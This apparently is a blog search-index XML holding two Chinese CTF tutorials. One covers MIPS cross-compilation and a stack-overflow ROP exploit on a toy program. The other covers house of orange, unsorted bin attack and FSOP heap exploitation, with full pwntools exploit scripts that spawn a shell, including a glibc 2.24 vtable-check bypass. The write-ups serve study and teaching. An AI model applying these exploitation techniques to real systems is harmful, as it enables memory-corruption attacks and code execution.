<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mips编译环境配置与简单栈溢出]]></title>
    <url>%2F2020%2F05%2F12%2Fmips%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[环境编译首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天） buildroot下载：buildroot 解压之后，configs里面有一个qemu_mips32r2el_malta_defconfig这样的配置，可以进去找找看有没有，我们回到主目录，直接make qemu_mips32r2el_malta_defconfig 12coyote@ubuntu:~/buildroot-2020.02.1$ make qemu_mips32r2el_malta_defconfigcoyote@ubuntu:~/buildroot-2020.02.1$ make make qemu…那个命令就是配置相对应的环境，就不用手动make menuconfig 去设置了。 进入menuconfig界面之后选择第一项Target Architecture，改成MIPS（little endian）（默认编译小端程序），另外，选择Toolchain，将Kernel Headers的Linux版本改成自己主机的Linux版本（因为我们编译出的MIPS交叉工具是需要在我们的主机上运行的） 之后make就好了（过程可能会很漫长，耐心等吧编译完成之后，在buildroot/output/host/bin下就有mipsel-linux-gcc了，我们就可以通过它编译了 1~/buildroot-2020.02.1/output/host/bin/mipsel-linux-gcc test.c -o test -static 不过这样还是有点麻烦，所以我们可以直接配置环境变量 123gedit ~/.bashrcexport PATH=$PATH:/home/coyote/buildroot-2020.02.1/output/host/usr/bin #写入文件source ~/.bashrc 然后我们就可以直接通过命令编译,不用带上路径了 1mipsel-linux-gcc test.c -o test -static IDA mipsrop下载 mipsrop.py 直接放到plugins下,然后重启就可以在ida的search里面找到mips rop gadgets 点击这个之后，可以在idapython框里面输入mipsrop的命令，主要如下 1234mipsrop.stackfinder() 寻找栈数据可控的 rop，建立和 a0、a1 寄存器的关系mipsrop.summary() 列出所有的可用 ropmipsrop.system() 寻找命令执行的的ropmipsrop.find(xxx) 查找 find 函数参数的 rop，类似正则匹配 mips的指令集特点主要的两个概念 叶子函数：当前函数不再调用其他函数。 非叶子函数：当前函数调用其他函数。 指令特点： 固定4字节指令长度。 MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中。 流水线效应。MIPS采用了高度的流水线，最重要的两个效应就是分支延迟效应和载入延迟效应。 没有堆栈直接操作的指令，也就是没有 push 和 pop 指令 具体可以参考： mips的汇编基础 mips的指令和用法 mips的溢出rop链用了全网都在用的那个例子，也是《揭秘家用路由器0day漏洞挖掘技术》里面的例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; 编译完之后，丢进ida看看程序是干什么的 会发现程序读入了一个passwd文件，然后passwd不对就会输出”you have an invalid password!n” 我们要利用溢出来绕过这个 所以我们先往passwd里面填充大量字符 1coyote@ubuntu:~/mips_test$ python -c &quot;print &apos;a&apos;*0x200&quot; &gt; passwd 起qemu，然后gdb连接 123456789#terminal 1coyote@ubuntu:~/mips_test$ qemu-mipsel -g 1234 ./test #-g是开放远程连接，gdb调试，1234是开放的端口#terminal 2coyote@ubuntu:~/mips_test$ gdb-multiarch ./testpwndbg&gt; target remote :1234 attach# 如果第一次远程调的话，先# pwndbg&gt;set arch mips# pwndbg&gt;set endian little gdb的调试分析过程：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354pwndbg&gt; target remote :1234 attachpwndbg&gt; cContinuing.Program received signal SIGSEGV, Segmentation fault.0x61616161 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── V0 0x0 V1 0x1 A0 0x1 A1 0x1 A2 0x4b A3 0x39 T0 0x0 T1 0x2a7f6573 T2 0xffffffff T3 0x64726f77 (&apos;word&apos;) T4 0x0 T5 0x0 T6 0x0 T7 0x0 T8 0x1e T9 0x40479c (__pthread_return_0) ◂— jr $ra S0 0x0 S1 0x410000 (__preinit_array_start) ◂— 0xffffffff S2 0x0 S3 0x0 S4 0x0 S5 0x0 S6 0x0 S7 0x0 S8 0x61616161 (&apos;aaaa&apos;) FP 0x76ffec48 ◂— &apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0&apos; SP 0x76ffec48 ◂— &apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0&apos; PC 0x61616161 (&apos;aaaa&apos;)───────────────────────────────────[ DISASM ]───────────────────────────────────Invalid address 0x61616161───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ fp sp 0x76ffec48 ◂— &apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0&apos;... ↓─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 61616161──────────────────────────────────────────────────────────────────────────────── 通过这里可以看到跳转地址被改为了0x61616161，而存放这个内容的地址是0x76ffec48,所以计算从开始读入passwd文件的位置到跳转地址的字符偏移。 1234567891011121314151617181920212223pwndbg&gt; x/40gx 0x76ffea000x76ffea00: 0x00402744004105f4 0x0000000076ffea7c0x76ffea10: 0x0000000000000000 0x004011e0004181e00x76ffea20: 0x004105f800413c80 0x00000000000000020x76ffea30: 0x0000000000413c80 0x00000000000000000x76ffea40: 0x00400a3476ffea78 0x00400ac0000000000x76ffea50: 0x00000000000001b6 0x00000000004181e00x76ffea60: 0x0041000000000000 0x00000000000000000x76ffea70: 0x004006a000000000 0x0040e76a000000000x76ffea80: 0x0000000000001000 0x00000000004181e00x76ffea90: 0x00000201000000ff 0x00414908000002010x76ffeaa0: 0x0041490800414908 0x61616161616161610x76ffeab0: 0x6161616161616161 0x61616161616161610x76ffeac0: 0x6161616161616161 0x61616161616161610x76ffead0: 0x6161616161616161 0x61616161616161610x76ffeae0: 0x6161616161616161 0x61616161616161610x76ffeaf0: 0x6161616161616161 0x61616161616161610x76ffeb00: 0x6161616161616161 0x61616161616161610x76ffeb10: 0x6161616161616161 0x61616161616161610x76ffeb20: 0x6161616161616161 0x61616161616161610x76ffeb30: 0x6161616161616161 0x6161616161616161pwndbg&gt; distance 0x76ffeaa8 0x76ffec480x76ffeaa8-&gt;0x76ffec48 is 0x1a0 bytes (0x68 words) 所以我们要填充&#39;a&#39;*0x19c使得跳转地址没有被覆盖 ida里通过mips rop找到可用的rop 1234567Python&gt;mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------| Address | Action | Control Jump |----------------------------------------------------------------------------------------------------------------| 0x004034A0 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) |----------------------------------------------------------------------------------------------------------------Found 1 matching gadgets addiu $a1,$sp,0x58+var_40 –&gt; sp+0x18的位置放入参数(即’/bin/sh’) 0x58+var_40 = 0x58-0x40 = 0x18 jr 0x58+var_4($sp) –&gt; 跳转执行sp+0x54位置的函数 0x58+var_4($sp) = 0x58 - 0x4 = 0x54 1234pwndbg&gt; p/x $sp+24$2 = 0x76ffec60pwndbg&gt; distance 0x76ffec60 0x76ffeaa80x76ffec60-&gt;0x76ffeaa8 is -0x1b8 bytes (-0x6e words) 思路：其实之前的那个跳转地址就是我们的sp，所以我们再填充0x18个字节之后填入&#39;/bin/sh/x00&#39;作为system的参数，然后再填0x34个字节后，填入do_system的地址 exp：1234coyote@ubuntu:~/mips_test$ python -c &quot;print &apos;a&apos;*0x19c + &apos;\xa0\x34\x40\x00&apos; + 0x18*&apos;b&apos; + &apos;/bin/sh\x00&apos; + &apos;c&apos;*0x34 + &apos;\x70\x03\x40\x00&apos;&quot; &gt; passwdcoyote@ubuntu:~/mips_test$ qemu-mipsel ./test$ lspasswd test test_1 test.c 参考链接： https://www.jianshu.com/p/ba12cd4e530a https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow 书目推荐： 《揭秘家用路由器0day漏洞挖掘技术》（pdf版）]]></content>
  </entry>
  <entry>
    <title><![CDATA[house_of_orange]]></title>
    <url>%2F2020%2F03%2F10%2Fhouse-of-orange%2F</url>
    <content type="text"><![CDATA[其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。 对于house of orange操作的理解（glibc2.23）大体上是，没有free函数，通过改写top chunk，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。 在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，如果都不符合，接下来_int_malloc函数会试图使用 top chunk。 如果top chunk也无法满足的话，会执行以下的代码 123456789/*Otherwise, relay to handle system-dependent cases*/else &#123; void *p = sysmalloc(nb, av); if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p;&#125; 则需要执行 sysmalloc来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展（就是malloc的size要小于mmap的size），之后原有的 top chunk 会被置于 unsorted bin 中。 在 sysmalloc 函数中存在对 top chunk size 的 check，如下 1234assert((old_top == initial_top(av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp; ((unsigned long)old_end &amp; pagemask) == 0)); 这里是对top chunk 的合法性的检查。 想要伪造 ++top chunk++，就要满足以下几点： 伪造的 size 必须要对齐到内存页 size 要大于 MINSIZE(0x10) size 要小于之后申请的 chunk size + MINSIZE(0x10) size 的 prev inuse 位必须为 1 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。 这里用houseoforange这个题来操作一下吧 例子这题没有free操作，让人很容易联想得到house_of_orange的操作，upgrade对写入的size没有检查，可以直接溢出。 它结合了house of orange、unsorted bin attack 和FSOP的知识点 house of orange使在没有free的条件下改写topchunk，下一次malloc一个大于topchunk的size则可以将它写进unsorted bin的队列了 unsorted bin attack，通过malloc large bin（&gt;=512)，可以达到同时leak libc和heap的效果。随后再利用upgrade溢出，构造new chunk，在它的bk处存入_IO_list_all-0x10的地址（这个注意，unsorted bin attack的bk覆写一定是在之前并没有add的堆块，即被free掉的或者和这题的覆写一样的） FSOP，通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。 其中，unsorted bin attack和FSOP都是在最后一步malloc（0x10）的时候才实现的 关于IO FILE后面两步都会与一个叫_IO_FILE_plus的结构体有关系，那我们就先来看一下这个结构体吧 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; 而指向这个结构体的指针叫做_IO_list_all，它存在于符号表内（即可以libc.sym[‘_IO_list_all’]操作），定义如下 1extern struct _IO_FILE_plus *_IO_list_all; _IO_list_all一般指向的都是_IO_2_1_stderr正常的程序中存在stderr、sdout以及stdin三个IO FILE，他们之间的关系呢大概是这样的 就是 _IO_list_all-&gt;_IO_2_1_stderr _IO_2_1_stderr-&gt;_IO_2_1_stdout _IO_2_1_stdout-&gt;_IO_2_1_stdin 既然它牵扯到了IO FILE结构体里的东西，那我们就再倒回来说说这个结构体吧 _IO_FILE_plus结构体的第一part IO FILE的file结构（用gdb来看吧） 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *((struct _IO_FILE_plus *) 0x7f733765e540)$2 = &#123; file = &#123; _flags = -72540026, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7f733765e620 &lt;_IO_2_1_stdout_&gt;, _fileno = 2, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x7f733765f770 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7f733765d660 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7f733765c6e0 &lt;_IO_file_jumps&gt;&#125; chain指向的是下一个IO FILE结构体 而vtable呢是一个虚表指针，指向的是_IO_file_jumps 刚好_IO_FILE_plus的第二part就是这个虚表了： 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 在我们将IO_list_all链接进unsorted bin之后，unsortedbin的结构被破坏（IO_read_ptr=0,即size=0），再进行malloc就会触发malloc printerr报错 1234if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); 触发之后 1234函数大致调用链mallloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数//define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) _IO_flush_all_lockp源码： 123456789101112131415161718192021222324252627282930_IO_flush_all_lockp (int do_lock)&#123; int result = 0; FILE *fp;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock);#endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; &#125;#ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif return result;&#125; 要想调用到IO_overflow,就要满足if的绕过条件，即： ((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是 _IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 12可以将write_base-&gt;0,write_ptr-&gt;0x1,满足write_base&lt;write_ptr也可以改_wide_data为原old_top-0x10就好了，fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，在wide_data的io结构里，writer_base变成了之前的read_end,即我们构造的fd，writer_ptr变成了read_base,即我们构造的bk（io_list_all-0x10),只要满足前者的等式就好了 第一种会相对来说方便一点 然后把vtable指向自己，再把system填入IO_OVERFLEW，执行的时候就可以getshell了 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = 'debug'p = process('./houseoforange')elf = ELF('./houseoforange')libc = elf.libcdef add(size,name,price,color): p.recvuntil("Your choice : ") p.sendline("1") p.recvuntil("name :") p.sendline(str(size)) p.recvuntil("Name :") p.send(name) p.recvuntil("Orange:") p.sendline(str(price)) p.recvuntil("Orange:") p.sendline(str(color))def upgrade(size,name,price,color): p.recvuntil("Your choice : ") p.sendline("3") p.recvuntil("name :") p.sendline(str(size)) p.recvuntil("Name:") p.send(name) p.recvuntil("Orange:") p.sendline(str(price)) p.recvuntil("Orange:") p.sendline(str(color))def see(): p.recvuntil("Your choice : ") p.sendline("2")add(0x10,'aaaa',32,1)# gdb.attach(p)upgrade(0x40,'a'*0x10+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xfa1),32,1)add(0xfb0,'aaaa',32,1) #in unsorted bin listadd(0x400,'b'*8,32,1)# gdb.attach(p)see()p.recvuntil('b'*8)main_arena = u64(p.recv(6).ljust(8,'\x00')) - 1640print hex(main_arena)libc_base = main_arena - 0x3c4b20print hex(libc_base)upgrade(0x400,'b'*0x10,32,1)see()p.recvuntil('b'*0x10)heap_addr=u64(p.recv(6).ljust(8,'\x00'))print hex(heap_addr)_IO_list_all = libc.symbols['_IO_list_all'] + libc_basesystem = libc.symbols['system'] + libc_base#满足_IO_write_base &lt; _IO_write_ptr# pay = 'a'*0x400# pay += p64(0) + p64(0x21) + 'a'*0x10# io_file = '/bin/sh\x00' + p64(0x61) #'/bin/sh'是IO FILE，最后会作为IO_overflower的参数 victim-&gt;size=0# io_file += p64(0) +p64(_IO_list_all-0x10) #unsorted bin attack 把list_all写进unsorted bin队列里面，即list_all-&gt;构造的堆块处(not io_stderr)# io_file += p64(0) + p64(1) #绕检查_IO_write_base &lt; _IO_write_ptr# io_file += p64(0) * 18# io_file += p64(0) * 3# io_file += p64(heap_addr+0x508) #vtable -&gt;指向自己# pay += io_file + p64(0)*2# pay += p64(system)# upgrade(0x800,pay,32,1)# 满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_basepayload="x"*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)fake_chunk='/bin/sh\x00'+p64(0x61)#why ? io_file?fake_chunk+=p64(0)+p64(_IO_list_all-0x10)fake_chunk=fake_chunk.ljust(0xa0,'\x00')fake_chunk+=p64(heap_addr+0x420) # wide_data -&gt; read_end 然后就会调用虚表+0x18偏移处的函数了fake_chunk=fake_chunk.ljust(0xc0,'\x00')fake_chunk+=p64(1)payload+=fake_chunkpayload += p64(0)payload += p64(0)payload += p64(heap_addr+0x528) payload += p64(1)payload += p64(2)payload += p64(3)payload += p64(0)*3 # vtablepayload += p64(system)upgrade(0x800,payload,32,2)gdb.attach(p)#unsortbin.bk也被改写成了&amp;IO_list_all-0x10，所以此时的victim-&gt;size=0那么不会通过校验，进入malloc_printerr，触发异常。p.recvuntil("Your choice : ")p.sendline("1") #如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数p.interactive() 关于构造chunk的size为什么是0x60： 首先victim-&gt;size=0（IO FILE的伪unsorted bin结构里，size=0）会触发malloc printer（就是那个malloc错误）这个时候就会去调用IO_list_all那个系列的函数 在IO_FILE结构体中，偏移0x60的字段是struct _IO_marker *_markers，偏移0x68的字段是struct _IO_FILE *_chain。而这两个的值恰恰是old_top的起始地址。 原来改为0x60是为了将old_top加入smallbin[4]，而smallbin[4]的fd和bk指针恰好对应于IO_FILE结构体中的_markers和_chain字段。就能跳转至我们的old_top了 实现FSOP的调试在malloc最后一个堆块前我们去gdb里在_int_malloc看一下调用 出现error的字样时，chunk被写进smallbin[4] 此时的IO_FILE进入main_arena 此时chain的值为fack_chunk的地址，即old_top (这里是第二种绕过方式的截图) old_top里面chain为0，则往vtable执行 house of orange在glibc2.24下的利用glibc2.24开始引入vtable 的检测函数—— IO_validate_vtable 1234567891011121314static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123; /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;&#125; vtable需要满足的条件： 在 stop_IO_vtables 和 start_libc_IO_vtables 之间 而我们伪造的vtable通常不满足这个条件，但是可以找到 ==IO_str_jumps== 符合条件。（接下来就分析利用IO_str_jumps的绕过） __IO_str_jumps 结构如下: 1234567891011121314151617181920212223const struct _IO_jump_t _IO_str_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_str_pbackfail), JUMP_INIT(xsputn, _IO_default_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_str_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_default_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 我们利用_IO_str_finish进行接下来的绕过和利用 其源码为： 12345678void _IO_str_finish (FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) // call qword ptr [fp+0E8h] (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 我们可以知道绕过的条件是： 12fp-&gt;_flags= 0fp-&gt;_IO_buf_base = binsh_addr 此时我们使vtable存放指向_IO_str_jumps - 8处的指针 ，这样调用_IO_overflow时会调用到_IO_str_finish 不过，由于_IO_str_jumps不在符号表内，所以只能通过其他函数来间接得到它的地址，例如_IO_str_underflow，我们已知_IO_str_jumps 的地址大于_IO_file_jumps 地址，可以用此来确认_IO_str_underflow的地址，并且_IO_str_underflow=_IO_str_jummps+0x20 然后我在大佬的博客里看到一个特别6的方法可以直接算出偏移（不用手算！）： 1234567IO_file_jumps_offset = libc.sym['_IO_file_jumps']IO_str_underflow_offset = libc.sym['_IO_str_underflow']for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: print possible_IO_str_jumps_offset break 因为满足了if之后，会call qword ptr [fp+0E8h] 所以我们使 1fp+0xe8 = system_addr 就可以实现getshell了 这个方法在glibc 2.23和glibc 2.24里都适用 所以我们用上面那题来试一下这个方法，运用了大佬微博里自定义的的封装函数，构造我们的exp，然后就发现我们getshell成功了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = &apos;debug&apos;p = process(&apos;./houseoforange&apos;)elf = ELF(&apos;./houseoforange&apos;)libc = elf.libcdef add(size,name,price,color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;name :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Name :&quot;) p.send(name) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(color))def upgrade(size,name,price,color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;name :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Name:&quot;) p.send(name) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(color))def see(): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;2&quot;)def pack_file(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _wide_data = 0, _mode = 0): file_struct = p32(_flags) + \ p32(0) + \ p64(_IO_read_ptr) + \ p64(_IO_read_end) + \ p64(_IO_read_base) + \ p64(_IO_write_base) + \ p64(_IO_write_ptr) + \ p64(_IO_write_end) + \ p64(_IO_buf_base) + \ p64(_IO_buf_end) + \ p64(_IO_save_base) + \ p64(_IO_backup_base) + \ p64(_IO_save_end) + \ p64(_IO_marker) + \ p64(_IO_chain) + \ p32(_fileno) file_struct = file_struct.ljust(0x88, &quot;\x00&quot;) file_struct += p64(_lock) file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;) file_struct += p64(_wide_data) file_struct = file_struct.ljust(0xc0, &apos;\x00&apos;) file_struct += p64(_mode) file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;) return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr): payload = pack_file(_flags = 0, _IO_read_ptr = 0x61, #smallbin4file_size _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr, _IO_write_base = 0, _IO_write_ptr = 1, _IO_buf_base = binsh_addr, _mode = 0, ) payload += p64(_IO_str_jumps_addr-8) payload += p64(0) # paddding payload += p64(system_addr) return payloadadd(0x10,&apos;aaaa&apos;,32,1)# gdb.attach(p)upgrade(0x40,&apos;a&apos;*0x10+p64(0)+p64(0x21)+&apos;a&apos;*0x10+p64(0)+p64(0xfa1),32,1)add(0xfb0,&apos;aaaa&apos;,32,1) #in unsorted bin listadd(0x400,&apos;b&apos;*8,32,1)# gdb.attach(p)see()p.recvuntil(&apos;b&apos;*8)main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;)) - 1640print hex(main_arena)libc_base = main_arena - 0x3c4b20print hex(libc_base)upgrade(0x400,&apos;b&apos;*0x10,32,1)see()p.recvuntil(&apos;b&apos;*0x10)heap_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))print hex(heap_addr)_IO_list_all = libc.symbols[&apos;_IO_list_all&apos;] + libc_basesystem = libc.symbols[&apos;system&apos;] + libc_basebinsh_addr = next(libc.search(&quot;/bin/sh&quot;)) + libc_baseIO_file_jumps_offset = libc.sym[&apos;_IO_file_jumps&apos;]IO_str_underflow_offset = libc.sym[&apos;_IO_str_underflow&apos;]for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: print possible_IO_str_jumps_offset break _IO_str_jumps_addr=libc_base + possible_IO_str_jumps_offsetprint hex(_IO_str_jumps_addr)pay = &apos;a&apos;*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)file = pack_file_flush_str_jumps(_IO_str_jumps_addr,_IO_list_all,system,binsh_addr)pay+=fileupgrade(0x800,pay,32,2)gdb.attach(p)p.recvuntil(&quot;Your choice : &quot;)p.sendline(&quot;1&quot;) p.interactive() 